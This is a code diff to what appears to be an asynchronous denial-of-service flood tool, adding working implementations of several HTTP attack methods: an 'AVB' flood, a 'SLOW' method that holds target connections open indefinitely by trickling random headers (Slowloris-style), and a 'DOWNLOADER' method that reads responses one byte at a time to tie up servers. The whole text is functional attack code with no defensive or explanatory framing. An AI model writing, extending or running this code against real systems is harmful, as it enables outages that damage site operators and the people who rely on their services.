@@ -1081,7 +1081,7 @@ class AsyncHttpFlood(HttpFlood):
         payload: bytes = self.generate_payload()
         return await self._generic_flood(payload, rpc=min(self._rpc, 5))
     
-    def AVB(self) -> int:
+    async def AVB(self) -> int:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
@@ -1091,15 +1091,55 @@ class AsyncHttpFlood(HttpFlood):
             await asyncio.wait_for(writer.drain(), timeout=1)
             packets_sent += 1
             self._stats.track(1, packet_size)
-            await asyncio.wait_for(reader.read(1), timeout=1)
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
         return packets_sent
 
+    # XXX: make sure writer is closed on exception
     async def SLOW(self) -> int:
-        pass
+        payload: bytes = self.generate_payload()
+        packets_sent, packet_size = 0, len(payload)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            packets_sent += 1
+            self._stats.track(1, packet_size)
+        while True:
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            packets_sent += 1
+            self._stats.track(1, packet_size)
+            await asyncio.wait_for(reader.read(1), timeout=1)
+            for i in range(self._rpc):
+                keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                writer.write(keep)
+                await asyncio.wait_for(writer.drain(), timeout=1)
+                self._stats.track(0, len(keep))
+                await asyncio.sleep(self._rpc / 15)
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        return packets_sent
 
+    # XXX: with default buffering setting this methods is gonna suck :(
     async def DOWNLOADER(self) -> int:
-        pass
-
+        payload: bytes = self.generate_payload()
+        packets_sent, packet_size = 0, len(payload)
+        reader, writer = await asyncio.wait_for(self.open_connection(), timeout=8)
+        for _ in range(self._rpc):
+            writer.write(payload)
+            await asyncio.wait_for(writer.drain(), timeout=1)
+            packets_sent += 1
+            self._stats.track(1, packet_size)
+            while True:
+                await asyncio.sleep(.01)
+                data = await reader.read(1)
+                if not data: break
+            writer.write(b'0')
+            await asyncio.wait_for(writer.drain(), timeout=1)
+        writer.close()
+        await asyncio.wait_for(writer.wait_closed(), timeout=1)
+        return packets_sent
 
 # XXX: the separation should be based on the socket type: TCP vs. UDP
 class AsyncLayer4(Layer4):
